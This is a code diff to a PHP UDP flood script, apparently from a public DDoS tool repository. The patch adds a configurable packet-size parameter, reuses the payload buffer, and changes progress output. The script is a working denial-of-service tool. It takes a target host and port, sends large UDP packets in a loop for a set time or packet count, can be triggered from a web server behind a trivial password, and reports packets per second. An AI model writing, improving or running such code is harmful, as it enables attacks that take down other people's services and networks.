@@ -14,7 +14,8 @@ define('DDOS_VERSION','0.1');
 define('DDOS_PASSWORD','pass');
 
 // Default packet size
-define('DDOS_PACKET_SIZE',65000);
+define('DDOS_DEFAULT_PACKET_SIZE',65000);
+define('DDOS_MAX_PACKET_SIZE',65000);
 
 /**
  * Script initializer
@@ -29,7 +30,6 @@ function init() {
 	if(!is_cli()) {
 		header("Content-Type: text/plain");
 	}
-	println();
 }
 
 
@@ -62,13 +62,14 @@ function usage() {
 	println();
 	println("PARAMETERS");
 	println("----------");
-	println("host	REQUIRED, specify IP or HOSTNAME");
-	println("pass	REQUIRED, only if used from webserver");
-	println("port	OPTIONAL, if not specified a random port will be selected");
-	println("time	OPTIONAL, seconds to keep the DDoS alive, required if packet is not used");
-	println("packet	OPTIONAL, number of packets to send to the target, required if time is not used");
+	println("host	REQUIRED specify IP or HOSTNAME");
+	println("pass	REQUIRED only if used from webserver");
+	println("port	OPTIONAL if not specified a random ports will be selected");
+	println("time	OPTIONAL seconds to keep the DDoS alive, required if packet is not used");
+	println("packet	OPTIONAL number of packets to send to the target, required if time is not used");
+	println("bytes	OPTIONAL size of the packet to send, defualt: ".DDOS_DEFAULT_PACKET_SIZE);
 	println();
-	println("Note: 	If both time and packet are used, only time will be used");
+	println("Note: 	If both time and packet are specified, only time will be used");
 	println();
 	println("More information on https://github.com/drego85/DDoS-PHP-Script");
 }
@@ -86,13 +87,11 @@ function is_cli() {
  * UDP Connect
  * @param string 	$h Host name or ip address
  * @param integer 	$p Port number
- * @param integer 	$ps Packet size
+ * @param string 	$out Data to send
  * @return boolean	True if the packet was sent
  */
-function udp_connect($h,$p,$ps){
+function udp_connect($h,$p,$out){
 
-	$out = str_repeat("0", $ps);
-	
 	$fp = @fsockopen('udp://'.$h, $p, $errno, $errstr, 30);
 	
 	if(!$fp) {
@@ -128,7 +127,8 @@ $params = array(
 	'port' => 	'',
 	'packet' => '',
 	'time'	=> 	'',
-	'pass'	=> 	''
+	'pass'	=> 	'',
+	'bytes' =>	''
 );
 
 
@@ -164,13 +164,26 @@ if(!empty($params['host']) && (is_numeric($params['time'])) || is_numeric($param
 		}
 	}
 	
-	$packets = 0; 
+	// Packets count
+	$packets = 0;
+
+	// TODO Validation for host 
 	$host = $params['host'];
+	
+	// Host
 	$port = get_port($params['port']);
 	
-	//TODO Add a param for the packet size
-	$packet_size = DDOS_PACKET_SIZE;
+	// Packet size
+	if(is_numeric($params['bytes'])) {
+		$packet_size = min($params['bytes'],DDOS_MAX_PACKET_SIZE);
+	}
+	else {
+		$packet_size = DDOS_DEFAULT_PACKET_SIZE;
+	}
 	
+	// Message
+	$message = str_repeat("0", $packet_size);
+	println("DDoS UDP flood started");
 	// Time based attack
 	if($params['time']){
 		$exec_time = $params['time']; 
@@ -178,8 +191,10 @@ if(!empty($params['host']) && (is_numeric($params['time'])) || is_numeric($param
 		
 		while(time() < $max_time){
 			$packets++;
-			if(udp_connect($host,$port,$packet_size)) {
-				println("Sending packet #".$packets);
+			if(udp_connect($host,$port,$message)) {
+				echo '.';
+				ob_flush();
+				flush();
 			}
 		}
 		$timeStr = $exec_time. " seconds";
@@ -191,8 +206,10 @@ if(!empty($params['host']) && (is_numeric($params['time'])) || is_numeric($param
 		
 		while($packets < $max_packet){
 			$packets++;
-			if(udp_connect($host,$port,$packet_size)) {
-				println("Sending packet #".$packets);
+			if(udp_connect($host,$port,$message)) {
+				echo '.';
+				ob_flush();
+				flush();
 			}
 		}
 		$exec_time = time() - $start_time;
@@ -211,6 +228,7 @@ if(!empty($params['host']) && (is_numeric($params['time'])) || is_numeric($param
 	println("DDoS UDP flood completed"); 
 	println('Host: ' . $host);
 	println('Port: '. $port);
+	// TODO Write a method to convert from bytes to kb, mb, gb ..ecc ecc
 	println("Packets: " .$packets .'/'.round((($packets*$packet_size)/1024)/1024, 2). ' MB');
 	println("Duration: " .$timeStr);
 	println("Avarage: " . round($packets/$exec_time, 2).' packet/second');
